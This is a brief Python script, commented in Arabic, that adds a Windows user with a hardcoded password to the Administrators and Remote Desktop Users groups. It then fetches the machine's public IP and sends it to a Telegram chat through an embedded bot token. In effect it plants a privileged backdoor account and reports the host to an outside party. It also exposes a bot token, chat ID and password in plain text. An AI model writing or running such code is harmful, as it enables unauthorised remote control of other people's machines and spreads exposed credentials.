import subprocess
import requests
import telebot

# معلومات البوت
TOKEN = "7771009457:AAH8Yrh__QB4gu0hduRUlMCoKdbeeVXOUYw"
CHAT_ID = "6506625990"
bot = telebot.TeleBot(TOKEN)

# بيانات المستخدم
username = "rdp6"
password = "FFMOHDZ.666"

# إنشاء المستخدم
try:
    subprocess.run(["net", "user", username, password, "/add"], check=True)
    subprocess.run(["net", "localgroup", "Administrators", username, "/add"], check=True)
    subprocess.run(["net", "localgroup", "Remote Desktop Users", username, "/add"], check=True)
    print(f"[+] تم إنشاء المستخدم {username} وإضافته للمجموعات.")
except subprocess.CalledProcessError as e:
    print(f"[-] حدث خطأ أثناء إنشاء المستخدم: {e}")

# الحصول على عنوان IP العام
try:
    ip = requests.get("https://api.ipify.org").text
except:
    ip = "تعذر الحصول على IP"

# إرسال IP إلى تيليغرام
try:
    bot.send_message(CHAT_ID, f"🖥️ RDP IP: {ip}")
    print("[+] تم إرسال IP إلى تيليغرام.")
except Exception as e:
    print(f"[-] خطأ في إرسال رسالة إلى تيليغرام: {e}")
